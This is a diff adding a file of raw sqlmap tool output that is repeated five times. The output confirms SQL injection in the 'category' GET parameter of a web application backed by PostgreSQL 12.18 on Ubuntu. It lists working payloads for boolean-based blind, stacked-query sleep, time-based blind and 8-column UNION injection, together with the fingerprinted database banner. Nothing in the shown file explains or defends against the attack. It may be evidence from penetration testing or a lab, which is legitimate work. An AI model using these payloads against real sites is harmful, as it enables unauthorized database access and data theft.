@@ -1,0 +1,110 @@
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Accessories' AND 1250=1250-- QTjO
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: category=Accessories';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: category=Accessories' AND 5815=(SELECT 5815 FROM PG_SLEEP(5))-- WenF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(120)||CHR(113))||(CHR(65)||CHR(108)||CHR(100)||CHR(89)||CHR(66)||CHR(103)||CHR(89)||CHR(100)||CHR(71)||CHR(66)||CHR(98)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(74)||CHR(100)||CHR(82)||CHR(106)||CHR(121)||CHR(116)||CHR(114)||CHR(86)||CHR(108)||CHR(112)||CHR(101)||CHR(77)||CHR(111)||CHR(83)||CHR(113)||CHR(88)||CHR(100)||CHR(115)||CHR(83)||CHR(72)||CHR(117)||CHR(114)||CHR(88)||CHR(122)||CHR(111))||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)),NULL,NULL-- JNpB
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Accessories' AND 1250=1250-- QTjO
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: category=Accessories';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: category=Accessories' AND 5815=(SELECT 5815 FROM PG_SLEEP(5))-- WenF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(120)||CHR(113))||(CHR(65)||CHR(108)||CHR(100)||CHR(89)||CHR(66)||CHR(103)||CHR(89)||CHR(100)||CHR(71)||CHR(66)||CHR(98)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(74)||CHR(100)||CHR(82)||CHR(106)||CHR(121)||CHR(116)||CHR(114)||CHR(86)||CHR(108)||CHR(112)||CHR(101)||CHR(77)||CHR(111)||CHR(83)||CHR(113)||CHR(88)||CHR(100)||CHR(115)||CHR(83)||CHR(72)||CHR(117)||CHR(114)||CHR(88)||CHR(122)||CHR(111))||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)),NULL,NULL-- JNpB
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Accessories' AND 1250=1250-- QTjO
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: category=Accessories';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: category=Accessories' AND 5815=(SELECT 5815 FROM PG_SLEEP(5))-- WenF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(120)||CHR(113))||(CHR(65)||CHR(108)||CHR(100)||CHR(89)||CHR(66)||CHR(103)||CHR(89)||CHR(100)||CHR(71)||CHR(66)||CHR(98)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(74)||CHR(100)||CHR(82)||CHR(106)||CHR(121)||CHR(116)||CHR(114)||CHR(86)||CHR(108)||CHR(112)||CHR(101)||CHR(77)||CHR(111)||CHR(83)||CHR(113)||CHR(88)||CHR(100)||CHR(115)||CHR(83)||CHR(72)||CHR(117)||CHR(114)||CHR(88)||CHR(122)||CHR(111))||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)),NULL,NULL-- JNpB
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Accessories' AND 1250=1250-- QTjO
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: category=Accessories';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: category=Accessories' AND 5815=(SELECT 5815 FROM PG_SLEEP(5))-- WenF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(120)||CHR(113))||(CHR(65)||CHR(108)||CHR(100)||CHR(89)||CHR(66)||CHR(103)||CHR(89)||CHR(100)||CHR(71)||CHR(66)||CHR(98)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(74)||CHR(100)||CHR(82)||CHR(106)||CHR(121)||CHR(116)||CHR(114)||CHR(86)||CHR(108)||CHR(112)||CHR(101)||CHR(77)||CHR(111)||CHR(83)||CHR(113)||CHR(88)||CHR(100)||CHR(115)||CHR(83)||CHR(72)||CHR(117)||CHR(114)||CHR(88)||CHR(122)||CHR(111))||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)),NULL,NULL-- JNpB
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Accessories' AND 1250=1250-- QTjO
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: category=Accessories';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: category=Accessories' AND 5815=(SELECT 5815 FROM PG_SLEEP(5))-- WenF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(120)||CHR(113))||(CHR(65)||CHR(108)||CHR(100)||CHR(89)||CHR(66)||CHR(103)||CHR(89)||CHR(100)||CHR(71)||CHR(66)||CHR(98)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(74)||CHR(100)||CHR(82)||CHR(106)||CHR(121)||CHR(116)||CHR(114)||CHR(86)||CHR(108)||CHR(112)||CHR(101)||CHR(77)||CHR(111)||CHR(83)||CHR(113)||CHR(88)||CHR(100)||CHR(115)||CHR(83)||CHR(72)||CHR(117)||CHR(114)||CHR(88)||CHR(122)||CHR(111))||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)),NULL,NULL-- JNpB
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
